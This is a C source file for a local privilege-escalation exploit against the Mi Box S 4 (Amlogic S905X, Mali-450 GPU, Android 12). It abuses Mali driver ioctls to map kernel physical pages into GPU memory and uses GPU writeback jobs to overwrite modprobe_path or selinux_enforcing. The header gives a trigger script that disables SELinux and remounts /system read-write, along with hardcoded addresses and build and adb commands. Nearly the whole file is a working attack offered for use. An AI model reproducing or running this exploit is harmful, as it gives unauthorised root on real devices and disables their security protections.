/*
 * kort_miboxs.c
 * ---------------------------------------------------------------------------
 *  Port of the "kort" privilege-escalation (提权) exploit to the
 *  Mi Box S 4 (MIBOX4 / "oneday") - Amlogic S905X, Mali-450 MP (Utgard).
 *
 *  Based on the RIPMaliUtgard "kort" family (luke-m). The bug class:
 *    arbitrary physical memory -> GPU mapping (incl. kernel pages) +
 *    PP write-back job as a write primitive.
 *
 *  DEVICE (from use.md / miboxs.txt):
 *    Model      : MIBOX4 / oneday        SoC    : Amlogic AMLS905X (Mali-450 MP, Utgard)
 *    Kernel     : 4.9.269-ab4536         Android: 12 (SDK 31)
 *    ABI        : 32-bit userland (armeabi-v7a) + 64-bit kernel (ARM64)
 *    SELinux    : Enforcing
 *    Mali driver: r10p1 (open-source, from /vendor/amlogic/common/gpu/utgard/r10p1)
 *
 *  ARCHITECTURE (IMPORTANT):
 *    - Userland is 32-bit: compile with armv7a-linux-androideabi24-clang,
 *      all ioctl structs use the 32-bit layout below (verified by probing).
 *    - Kernel is 64-bit ARM64 with CONFIG_RANDOMIZE_BASE=y, BUT the KASLR
 *      slide only randomizes the VIRTUAL address; the PHYSICAL load address
 *      of the kernel image is fixed by the bootloader at 0x01080000.
 *      Our write primitive is physical (GPU DMA), so we do NOT need a leak:
 *          phys_addr(symbol) = 0x01080000 + RVA(symbol)
 *      (verified: modprobe_path RVA 0x175f960 -> phys 0x027df960, page
 *       0x027df000 + in-page offset 0x960; selinux_enforcing RVA 0x19b94ec
 *       -> phys 0x02a394ec. RVAs extracted from kernel.bin kallsyms via
 *       vmlinux-to-elf, cross-checked against the on-disk banner string.)
 *
 *  EXPLOIT FLOW (data-only, no ret2usr -> PAN-proof):
 *    1. ALLOC_MEM a GPU job-data buffer (mmap-able)         0xC0288300
 *    2. BIND the modprobe_path kernel page into GPU VA      0xC0288302
 *    3. Build PP job: WB0 writes a u32 from FR_CLEAR_COLOR
 *       to GPU_VA_TGT + off. FRAME MUST FIT IN ONE 4K PAGE:
 *         W x H x bpp <= 4096  ->  W=H=0x10, RGBA8888 (4 B/px) = 1 KB
 *         (the old 256x256 = 256 KB frame overran the BIND page and
 *          produced PP status UNKNOWN_ERR / MMU bus error)
 *    4. Write the payload string "/data/local/tmp/x" into modprobe_path
 *       (5 x u32 WB jobs), then execve() a bogus binary -> kernel calls
 *       request_module() -> runs our script as root.
 *    5. Fallback target: selinux_enforcing (phys 0x02a394ec) write 0.
 *
 *  Trigger script /data/local/tmp/x:
 *      #!/system/bin/sh
 *      /system/bin/setenforce 0
 *      /system/bin/mount -o rw,remount /system
 *      echo "root:root" > /data/local/tmp/pw   # or whatever payload
 *
 *  BUILD (32-bit, static):
 *    $ndk = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\21.4.7075529"
 *    & "$ndk\toolchains\llvm\prebuilt\windows-x86_64\bin\armv7a-linux-androideabi24-clang.cmd" kort_miboxs.c -o kort_miboxs -static
 *    adb push kort_miboxs /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/kort_miboxs
 *    adb shell /data/local/tmp/kort_miboxs
 *
 *  Modes:
 *    default          : write modprobe_path payload + trigger modprobe
 *    --verify         : write "////" to modprobe_path, read back via
 *                       /proc/sys/kernel/modprobe, then restore. Safe test.
 *    --selinux        : write 0 to selinux_enforcing (fallback)
 * ---------------------------------------------------------------------------
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <errno.h>
#include <signal.h>

/* =========================================================================
 *  CONFIG  -  filled from kernel.bin kallsyms (syms_rva.json), all PHYSICAL
 *             addresses, no KASLR leak needed (phys layout is fixed).
 * ========================================================================= */
#define KERNEL_PHYS_BASE        0x01080000u   /* _text physical load addr   */

/* modprobe_path  (char[256] in kernel .data) */
#define MODPROBE_PATH_RVA       0x175F960u    /* RVA from kallsyms          */
#define MODPROBE_PATH_PHYS      (KERNEL_PHYS_BASE + MODPROBE_PATH_RVA) /* 0x027df960 */
#define MODPROBE_PATH_PAGE      (MODPROBE_PATH_PHYS & ~0xFFFu) /* 0x027df000 */
#define MODPROBE_PATH_INPAGE    (MODPROBE_PATH_PHYS & 0xFFFu)  /* 0x960    */

/* selinux_enforcing  (int, BSS) */
#define SELINUX_ENFORCING_RVA   0x19B94ECu
#define SELINUX_ENFORCING_PHYS  (KERNEL_PHYS_BASE + SELINUX_ENFORCING_RVA) /* 0x02a394ec */

/* payload written into modprobe_path (16 bytes incl NUL) */
#define MODPROBE_PAYLOAD        "/data/local/tmp/x"

/* =========================================================================
 *  ioctl numbers - HARDCODED from mali.ko r10p1 disassembly (verified by
 *  probes; do NOT use the _IOWR macros, they are not reliable cross-ABI)
 * ========================================================================= */
#define MALI_IOC_MEM_ALLOC      0xC0288300u   /* MEMORY nr=0 size=40 */
#define MALI_IOC_MEM_FREE       0xC0108301u   /* MEMORY nr=1 size=16 */
#define MALI_IOC_MEM_BIND       0xC0288302u   /* MEMORY nr=2 size=40 */
#define MALI_IOC_MEM_UNBIND     0xC0108303u   /* MEMORY nr=3 size=16 */
#define MALI_IOC_PP_START_JOB   0xC1988400u   /* PP nr=0 size=408   */
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202u /* CORE nr=2 size=104 */
#define MALI_IOC_CREATE_CONTEXT 0xC0108203u   /* CORE nr=3 size=16  */
#define MALI_IOC_TERMINATE_CONTEXT 0xC0108204u

#define _MALI_NOTIFICATION_PP_FINISHED ((2 << 16) | 0x10)

/* flag for mem */
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

/* struct size constants */
#define MALI_UK_TIMELINE_MAX 3
#define _MALI_PP_MAX_SUB_JOBS 8
#define _MALI_PP_MAX_FRAME_REGISTERS 23
#define _MALI_PP_MAX_WB_REGISTERS 12
#define _MALI_DLBU_MAX_REGISTERS 4

/* ---- 32-bit userland structs (match mali.ko r10p1, verified by probes) ---- */
typedef struct
{
    uint64_t ctx;             /* 0-7  */
    uint32_t gpu_vaddr;       /* 8-11 (input!) */
    uint32_t vsize;           /* 12-15 */
    uint32_t psize;           /* 16-19 */
    uint32_t flags;           /* 20-23 */
    uint64_t backend_handle;  /* 24-31 (output) */
    int32_t  secure_shared_fd;/* 32-35 */
} mali_uk_alloc_mem_s;        /* 40 bytes */

typedef struct
{
    uint64_t ctx;             /* 0-7  */
    uint32_t gpu_vaddr;       /* 8-11 */
    uint32_t free_pages_nr;   /* 12-15 */
} mali_uk_free_mem_s;         /* 16 bytes */

typedef struct
{
    uint64_t ctx;             /* 0-7  */
    uint32_t vaddr;           /* 8-11 */
    uint32_t size;            /* 12-15 */
    uint32_t flags;           /* 16-19 */
    uint32_t padding;         /* 20-23 */
    uint32_t phys_addr;       /* 24-27 (bind_ext_memory) */
    uint32_t rights;          /* 28-31 */
    uint32_t bind_flags;      /* 32-35 */
    uint32_t pad2;            /* 36-39 */
} mali_uk_bind_mem_s;         /* 40 bytes */

typedef struct
{
    uint64_t ctx;             /* 0-7  */
    uint32_t vaddr;           /* 8-11 */
    uint32_t flags;           /* 12-15 */
} mali_uk_unbind_mem_s;       /* 16 bytes */

typedef struct
{
    uint32_t points[MALI_UK_TIMELINE_MAX];
    int32_t  sync_fd;
} mali_uk_fence_t;

typedef struct
{
    uint64_t ctx;                              /* 0-7 */
    uint64_t user_job_ptr;                     /* 8-15 */
    uint32_t priority;                         /* 16-19 */
    uint32_t frame_registers[23];              /* 20-111 */
    uint32_t frame_registers_addr_frame[7];    /* 112-139 */
    uint32_t frame_registers_addr_stack[7];    /* 140-167 */
    uint32_t wb0_registers[12];                /* 168-215 */
    uint32_t wb1_registers[12];                /* 216-263 */
    uint32_t wb2_registers[12];                /* 264-311 */
    uint32_t dlbu_registers[4];                /* 312-327 */
    uint32_t num_cores;                        /* 328-331 */
    uint32_t perf_counter_flag;                /* 332-335 */
    uint32_t perf_counter_src0;                /* 336-339 */
    uint32_t perf_counter_src1;                /* 340-343 */
    uint32_t frame_builder_id;                 /* 344-347 */
    uint32_t flush_id;                         /* 348-351 */
    uint32_t flags;                            /* 352-355 */
    uint32_t tilesx;                           /* 356-359 */
    uint32_t tilesy;                           /* 360-363 */
    uint32_t heatmap_mem;                      /* 364-367 */
    uint32_t num_memory_cookies;               /* 368-371 */
    uint64_t memory_cookies;                   /* 372-379 */
    mali_uk_fence_t fence;                     /* 380-395 */
    uint64_t timeline_point_ptr;               /* 396-403 */
} mali_uk_pp_start_job_s;                      /* 404 -> align 408 */

typedef struct
{
    uint64_t ctx;             /* 0-7 */
    uint32_t type;            /* 8-11 (output) */
    uint32_t _pad;            /* 12-15 */
    uint8_t  data[88];        /* 16-103 */
} mali_uk_wait_for_notification_s;             /* 104 bytes */

/* PP frame register indices (hardware-defined) */
#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR 1
#define FR_FLAGS 3
#define FR_CLEAR_DEPTH 4
#define FR_CLEAR_STENCIL 5
#define FR_CLEAR_COLOR_0 6
#define FR_CLEAR_COLOR_1 7
#define FR_CLEAR_COLOR_2 8
#define FR_CLEAR_COLOR_3 9
#define FR_WIDTH 10
#define FR_HEIGHT 11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13
#define FR_DUBYA 18
#define FR_BLOCKING 20
#define FR_SCALE 21
#define FR_FOUREIGHT 22

/*
 * WB register indices.
 *
 * NOTE (r10p0/r10p1 hardware layout, from mali_pp.c reset values):
 *   [0] Source Select          (0 = disabled)
 *   [1] Target Address
 *   [2] Target Pixel Format
 *   [3] Target AA Format
 *   [4] Target Layout
 *   [5] Target Scanline Length (pitch)
 *   [6] Target Flags           <-- kort legacy calls this "WB_MRT_BITS"!
 *   [7] MRT Enable
 *   [8] MRT Offset
 *   [9] Global Test Enable
 *   [10] Global Test Reference Value
 *   [11] Global Test Compare Function
 * The kort (r3p2-era) field names below map to different hardware slots on
 * this r10p1 driver: legacy "WB_MRT_BITS" lands in Target Flags[6].
 */
#define WB_TYPE 0
#define WB_ADDRESS 1
#define WB_PIXEL_FORMAT 2
#define WB_DOWNSAMPLE 3
#define WB_PIXEL_LAYOUT 4
#define WB_PITCH 5
#define WB_MRT_BITS 6      /* legacy name; r10p1 hardware: Target Flags */
#define WB_MRT_ENABLE 7    /* r10p1: MRT Enable */

/*
 *  PP FRAME SIZE - CRITICAL.
 *  The BIND target page is a single 4 KB physical page. The writeback unit
 *  writes W x H pixels; with RGBA8888 (4 B/px) a 256x256 frame = 256 KB of
 *  writes that blow past the 4 KB page -> MMU bus error -> status
 *  UNKNOWN_ERR (bit 23). Keep W x H x bpp <= 4096:
 *      W = H = 0x10 (16x16), 16*16*4 = 1 KB  <- fits
 *  WB_PITCH must match the 16-pixel row: 16 px * 4 B / 8 = 8.
 */
#define PP_WIDTH  0x10
#define PP_HEIGHT 0x10
#define WB_PITCH_VAL 8

/* Constant-colour fragment shader (output = clear_color register) */
static const uint32_t fragment_shader[] = {
    0x00020425,
    0x0000000c,
    0x01e007cf,
    0xb0000000,
    0x000005f5,
};

#define PAGE_SIZE 4096

/* GPU VA layout */
#define GPU_VA_DATA  0x40000000u
#define GPU_VA_TGT   0x40300000u
#define BUF_SIZE     0x4000

/* Buffer offsets for job components */
#define OFF_PLB 0x000
#define OFF_SHADER 0x080
#define OFF_RSW 0x100
#define OFF_TILEBLK 0x200
#define OFF_STACK 0x1000

static int fd = -1;
static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }

/* compile-time checks: sizes must match the hardcoded ioctl command values */
_Static_assert(sizeof(mali_uk_alloc_mem_s) == 40,  "alloc must be 40 bytes");
_Static_assert(sizeof(mali_uk_bind_mem_s) == 40,   "bind must be 40 bytes");
_Static_assert(sizeof(mali_uk_free_mem_s) == 16,   "free must be 16 bytes");
_Static_assert(sizeof(mali_uk_unbind_mem_s) == 16, "unbind must be 16 bytes");
_Static_assert(sizeof(mali_uk_pp_start_job_s) == 408, "pp job must be 408 bytes");
_Static_assert(sizeof(mali_uk_wait_for_notification_s) == 104, "wait must be 104 bytes");

/* ioctl wrapper with alarm timeout (drivers can hang on bad args!) */
static int tio(unsigned int cmd, void *buf, int t)
{
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static const char *status_str(uint32_t s)
{
    if (s & (1 << 16)) return "SUCCESS";
    if (s & (1 << 17)) return "OUT_OF_MEMORY";
    if (s & (1 << 18)) return "ABORT";
    if (s & (1 << 19)) return "TIMEOUT";
    if (s & (1 << 20)) return "HANG";
    if (s & (1 << 21)) return "SEG_FAULT";
    if (s & (1 << 22)) return "ILLEGAL_JOB";
    if (s & (1 << 23)) return "UNKNOWN_ERR";
    return "???";
}

static int bind_phys(uint32_t phys, uint32_t gpu_va, uint32_t size)
{
    mali_uk_bind_mem_s b;
    memset(&b, 0, sizeof(b));
    b.vaddr = gpu_va;
    b.size = size;
    b.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    b.phys_addr = phys;
    b.rights = 0x37;
    return tio(MALI_IOC_MEM_BIND, &b, 3);
}

static int unbind(uint32_t gpu_vaddr)
{
    mali_uk_unbind_mem_s u;
    memset(&u, 0, sizeof(u));
    u.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    u.vaddr = gpu_vaddr;
    return tio(MALI_IOC_MEM_UNBIND, &u, 3);
}

/*
 * Submit one PP job: writeback unit copies FR_CLEAR_COLOR_0..3 (all == value)
 * to gpu_target (GPU VA). Returns 0 on PP_FINISHED+SUCCESS.
 *
 * wb_cfg  bits (diag knobs, from r10p1 WB register layout):
 *   bit0: WB enable      (0 -> Source Select=0, WB unit fully disabled)
 *   bit1: use legacy MRT_BITS=4 in Target Flags[6]  (1 = kort legacy config)
 *   bit2: set MRT Enable[7] = 4
 *   bit3: set FR_FRAG_STACK_SIZE = 0x400 (default 0)
 */
static int wb_write_u32(uint32_t *buf, uint32_t gpu_target, uint32_t value,
                        uint32_t wb_cfg)
{
    memset(buf, 0, 0x2000);

    memcpy((uint8_t *)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));

    uint32_t *rsw = (uint32_t *)((uint8_t *)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + OFF_SHADER) | 5;
    rsw[0x0D] = 0x00000100;

    uint32_t *plb = (uint32_t *)buf;
    plb[0] = 0x00000000;
    plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | (((GPU_VA_DATA + OFF_TILEBLK) >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000;
    plb[4] = 0x00000000;
    plb[5] = 0xBC000000;

    mali_uk_pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xDEADBEEFCAFEBABEULL;
    job.num_cores = 1;

    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + OFF_PLB;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + OFF_RSW;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH]     = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_STENCIL]   = 0;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = PP_WIDTH;   /* 0x10 */
    job.frame_registers[FR_HEIGHT]          = PP_HEIGHT;  /* 0x10 */
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + OFF_STACK;
    job.frame_registers[FR_FRAG_STACK_SIZE] = (wb_cfg & 0x8) ? 0x400 : 0;
    if (wb_cfg & 0x10) {
        /* cfg "clean": zero out Mali-400-specific frame regs (0x8888/0x0C/0x77
         * not present in the Mali-450 libGLES_mali.so) */
        job.frame_registers[FR_DUBYA]     = 0;
        job.frame_registers[FR_BLOCKING]  = 0;
        job.frame_registers[FR_SCALE]     = 0;
        job.frame_registers[FR_FOUREIGHT] = 0;
    } else {
        job.frame_registers[FR_DUBYA]     = 0x77;  /* Mali-400 legacy */
        job.frame_registers[FR_BLOCKING]  = 0;
        job.frame_registers[FR_SCALE]     = 0x0C;  /* Mali-400 legacy */
        job.frame_registers[FR_FOUREIGHT] = 0x8888;/* Mali-400 legacy tilebuffer */
    }

    if (wb_cfg & 0x10) {
        /* also simplify the RSW: keep only the shader address */
        uint32_t *rsw_clean = (uint32_t *)((uint8_t *)buf + OFF_RSW);
        rsw_clean[0x08] = 0;
        rsw_clean[0x09] = (GPU_VA_DATA + OFF_SHADER) | 5;
        rsw_clean[0x0D] = 0;
    }

    if (wb_cfg & 0x1) {
        /* WB enabled: Source Select = 2 (color source) */
        job.wb0_registers[WB_TYPE]         = 0x02;
        job.wb0_registers[WB_ADDRESS]      = gpu_target;
        job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;   /* RGBA8888 */
        job.wb0_registers[WB_DOWNSAMPLE]   = 0;
        job.wb0_registers[WB_PIXEL_LAYOUT] = 0;
        job.wb0_registers[WB_PITCH]        = WB_PITCH_VAL; /* 8 == 16px*4B/8 */
        if (wb_cfg & 0x2) {
            job.wb0_registers[WB_MRT_BITS] = 4;   /* legacy kort: into Target Flags[6] */
        }
        if (wb_cfg & 0x4) {
            job.wb0_registers[WB_MRT_ENABLE] = 4; /* MRT Enable[7] */
        }
    }
    /* else: Source Select stays 0 -> WB unit disabled (render-only job) */

    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;

    /* flush CPU cache so the GPU can see the job descriptors (NOT msync!) */
    __builtin___clear_cache((char *)buf, (char *)buf + 0x2000);

    int r = tio(MALI_IOC_PP_START_JOB, &job, 5);
    if (r == -999) { printf("  [-] PP_START_JOB TIMEOUT (driver hung!)\n"); return -999; }
    if (r != 0) { printf("  [-] PP_START_JOB err=%d (%s)\n", -r, strerror(-r)); return r; }

    mali_uk_wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    r = tio(MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5);
    if (r == -999) { printf("  [-] WAIT TIMEOUT (driver hung!)\n"); return -999; }
    if (r != 0) { printf("  [-] WAIT err=%d (%s)\n", -r, strerror(-r)); return r; }

    if (notif.type != _MALI_NOTIFICATION_PP_FINISHED) {
        printf("  [?] unexpected notification type 0x%08x\n", notif.type);
        return -2;
    }
    uint32_t status;
    memcpy(&status, notif.data + 8, 4);
    printf("  [+] PP_FINISHED status=0x%08x (%s)\n", status, status_str(status));
    return (status & (1 << 16)) ? 0 : -1;
}

/* read current modprobe_path via /proc/sys/kernel/modprobe */
static void read_modprobe(const char *tag)
{
    char cur[64] = {0};
    int pfd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (pfd >= 0) { read(pfd, cur, 32); close(pfd); }
    printf("  [%s] modprobe: '%s'\n", tag, cur);
}

/* execve() a bogus binary -> binfmt miss -> request_module -> modprobe_path */
static void trigger_modprobe(void)
{
    const char *path = "/data/local/tmp/tri";
    int pfd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (pfd < 0) { printf("  [-] create trigger: %s\n", strerror(errno)); return; }
    write(pfd, "\xff\xff\xff\xff", 4);
    close(pfd);
    chmod(path, 0777);

    printf("  [*] execve(%s) -> request_module...\n", path);
    if (fork() == 0) {
        char *argv[] = { (char *)path, NULL };
        execve(path, argv, NULL);
        _exit(0);
    }
    wait(NULL);
}

/* write a NUL-terminated string into modprobe_path, 4 bytes per PP job */
static int write_modprobe_payload(uint32_t *buf, const char *payload)
{
    size_t len = strlen(payload) + 1;          /* include NUL */
    size_t nwords = (len + 3) / 4;
    printf("  [*] writing %zu bytes (as %zu u32) to modprobe_path phys 0x%08x+0x%03x\n",
           len, nwords, MODPROBE_PATH_PAGE, MODPROBE_PATH_INPAGE);

    for (size_t i = 0; i < nwords; i++) {
        uint32_t v = 0;
        for (size_t j = 0; j < 4; j++) {
            size_t off = i * 4 + j;
            if (off < len)
                v |= ((uint32_t)(uint8_t)payload[off]) << (8 * j);
        }
        printf("  [*] WB[%zu] 0x%08x -> modprobe_path+0x%zx\n", i, v, i * 4);
        int r = wb_write_u32(buf, GPU_VA_TGT + MODPROBE_PATH_INPAGE + (uint32_t)(i * 4), v, 0x3);
        if (r != 0) return r;
    }
    return 0;
}

int main(int argc, char **argv)
{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    int mode_verify = 0, mode_selinux = 0, mode_diag = 0;
    if (argc > 1) {
        if (!strcmp(argv[1], "--verify"))  mode_verify = 1;
        else if (!strcmp(argv[1], "--selinux")) mode_selinux = 1;
        else if (!strcmp(argv[1], "--diag")) mode_diag = 1;
        else { printf("usage: %s [--verify | --selinux | --diag]\n", argv[0]); return 1; }
    }

    printf("\n");
    printf("\033[38;5;22m");
    printf("██   ██  ██████  ██████  ████████ \n");
    printf("\033[38;5;28m");
    printf("██  ██  ██    ██ ██   ██    ██    \n");
    printf("\033[38;5;34m");
    printf("█████   ██    ██ ██████     ██    \n");
    printf("\033[38;5;40m");
    printf("██  ██  ██    ██ ██   ██    ██    \n");
    printf("\033[38;5;46m");
    printf("██   ██  ██████  ██   ██    ██    \n");
    printf("\033[0m");
    printf("\n\033[38;5;34m         Mi Box S 4 (MIBOX4 / oneday)\033[0m\n\n");

    printf("[*] mode=%s\n", mode_verify ? "verify" : (mode_selinux ? "selinux" : (mode_diag ? "diag" : "modprobe")));
    printf("[*] KERNEL_PHYS_BASE=0x%08x (fixed, no KASLR leak needed)\n", KERNEL_PHYS_BASE);
    printf("[*] modprobe_path  phys=0x%08x (page 0x%08x + 0x%03x)\n",
           MODPROBE_PATH_PHYS, MODPROBE_PATH_PAGE, MODPROBE_PATH_INPAGE);
    printf("[*] selinux_enforcing phys=0x%08x\n", SELINUX_ENFORCING_PHYS);

    fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { printf("[-] open /dev/mali: %s\n", strerror(errno)); return 1; }
    printf("[+] opened /dev/mali (fd=%d)\n", fd);

    /* ALLOC job data buffer (GPU VA 0x40000000) */
    mali_uk_alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE;
    alloc.psize = BUF_SIZE;
    int r = tio(MALI_IOC_MEM_ALLOC, &alloc, 3);
    if (r == -999) { printf("[-] ALLOC TIMEOUT\n"); close(fd); return 1; }
    if (r != 0) { printf("[-] ALLOC_MEM err=%d (%s)\n", -r, strerror(-r)); close(fd); return 1; }
    printf("[+] ALLOC_MEM OK (backend=0x%llx)\n", (unsigned long long)alloc.backend_handle);

    void *buf = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { printf("[-] mmap job buf: %s\n", strerror(errno)); close(fd); return 1; }
    printf("[+] mmap job buf OK (%p)\n", buf);

    /* ---- selinux mode: write 0 to selinux_enforcing ---- */
    if (mode_selinux) {
        uint32_t page = SELINUX_ENFORCING_PHYS & ~0xFFFu;
        uint32_t inpg = SELINUX_ENFORCING_PHYS & 0xFFFu;
        printf("[1] BIND selinux page 0x%08x -> GPU VA\n", page);
        if (bind_phys(page, GPU_VA_TGT, PAGE_SIZE) != 0) {
            printf("[-] BIND failed (%s)\n", strerror(errno)); goto out;
        }
        printf("[+] BIND OK. Writing 0 -> selinux_enforcing+0x%03x\n", inpg);
        r = wb_write_u32((uint32_t *)buf, GPU_VA_TGT + inpg, 0, 0x3);
        printf("[%s] selinux_enforcing write: %s\n",
               r == 0 ? "+" : "-", r == 0 ? "OK (SELinux may now be permissive)" : "FAILED");
        goto out;
    }

    /* ---- verify mode: safe "////" write + readback + restore ---- */
    if (mode_verify) {
        printf("[1] BIND modprobe page 0x%08x -> GPU VA\n", MODPROBE_PATH_PAGE);
        if (bind_phys(MODPROBE_PATH_PAGE, GPU_VA_TGT, PAGE_SIZE) != 0) {
            printf("[-] BIND failed (%s)\n", strerror(errno)); goto out;
        }
        printf("[+] BIND OK\n");
        read_modprobe("before");

        printf("[2] WB write '////' (0x2F2F2F2F) -> modprobe_path+0x%03x\n", MODPROBE_PATH_INPAGE);
        r = wb_write_u32((uint32_t *)buf, GPU_VA_TGT + MODPROBE_PATH_INPAGE, 0x2F2F2F2Fu, 0x3);
        if (r != 0) { printf("[-] WB job failed (ret=%d)\n", r); goto out; }

        read_modprobe("after-write");
        printf("  [*] NOTE: if after-write shows '////' the write landed.\n");
        printf("  [*] CPU cache may serve stale data; reboot clears it.\n");

        printf("[3] restore original value\n");
        /* "/sbin/modprobe" -> 4 x u32 */
        uint32_t orig[4] = {
            0x6962732Fu, /* "/sbi" */
            0x6F6D2F6Eu, /* "n/mo" */
            0x726F7074u, /* "tpor" */
            0x00656200u  /* "be\0\0" */
        };
        for (int i = 0; i < 4; i++) {
            r = wb_write_u32((uint32_t *)buf,
                             GPU_VA_TGT + MODPROBE_PATH_INPAGE + (uint32_t)(i * 4), orig[i], 0x3);
            if (r != 0) { printf("[-] restore[%d] failed (ret=%d)\n", i, r); break; }
        }
        read_modprobe("after-restore");
        goto out;
    }

    /* ---- diag mode: discriminate which PP job config causes the error ----
     * Each test writes to GPU-OWN memory (GPU_VA_DATA+0x3000, no BIND needed)
     * so we isolate the job-descriptor / WB config problem from the BIND page.
     * cfg bits: bit0=WB enable, bit1=legacy MRT_BITS=4, bit2=MRT Enable=4,
     *           bit3=FR_FRAG_STACK_SIZE=0x400
     */
    if (mode_diag) {
        uint32_t verify_gpu = GPU_VA_DATA + 0x3000;
        const char *names[6] = {
            "cfg0: WB disabled (render-only)          ",
            "cfg1: WB on, flags=0, stack=0            ",
            "cfg2: WB on, legacy MRT_BITS=4 (kort)    ",
            "cfg3: WB on, MRT_BITS=4 + MRT_Enable=4   ",
            "cfg4: WB on, MRT=4, stack=0x400          ",
            "cfg5: CLEAN (no WB, zero Mali400 frame)  ",
        };
        uint32_t cfgs[6] = { 0x0, 0x1, 0x3, 0x7, 0xB, 0x10 };

        printf("[DIAG] PP job config discrimination (target = GPU-own mem 0x%08x)\n", verify_gpu);
        for (int i = 0; i < 6; i++) {
            printf("  %s\n", names[i]);
            r = wb_write_u32((uint32_t *)buf, verify_gpu, 0x41414141u + (uint32_t)i, cfgs[i]);
            printf("  -> ret=%d\n\n", r);
        }

        printf("[DIAG] cfg6: CLEAN + stack=0x400 (zero Mali400 frame + no WB):\n");
        r = wb_write_u32((uint32_t *)buf, verify_gpu, 0x46464646u, 0x18);
        printf("  -> ret=%d\n", r);
        goto out;
    }

    /* ---- default: overwrite modprobe_path + trigger ---- */
    printf("[1] BIND modprobe page 0x%08x -> GPU VA\n", MODPROBE_PATH_PAGE);
    if (bind_phys(MODPROBE_PATH_PAGE, GPU_VA_TGT, PAGE_SIZE) != 0) {
        printf("[-] BIND failed (%s)\n", strerror(errno)); goto out;
    }
    printf("[+] BIND OK\n");
    read_modprobe("before");

    printf("[2] write payload \"%s\" into modprobe_path\n", MODPROBE_PAYLOAD);
    r = write_modprobe_payload((uint32_t *)buf, MODPROBE_PAYLOAD);
    if (r != 0) { printf("[-] payload write failed (ret=%d)\n", r); goto out; }

    read_modprobe("after-write");

    printf("[3] trigger request_module()\n");
    trigger_modprobe();

    printf("\n[4] did we get root?\n");
    if (getuid() == 0) {
        printf("[+] ROOT! uid=0. Shell:\n");
        char *shell = "/system/bin/sh";
        char *args[] = {shell, NULL};
        execve(shell, args, NULL);
    } else {
        printf("[-] not uid 0 yet. Check:\n");
        printf("    - did after-write show the payload?  (cache coherence)\n");
        printf("    - is /data/local/tmp/x executable + valid shell script?\n");
        printf("    - kernel log: adb logcat -b kernel | grep -i mali\n");
    }

out:
    munmap(buf, BUF_SIZE);
    mali_uk_free_mem_s mfree;
    memset(&mfree, 0, sizeof(mfree));
    mfree.gpu_vaddr = GPU_VA_DATA;
    tio(MALI_IOC_MEM_FREE, &mfree, 3);
    close(fd);
    return 0;
}
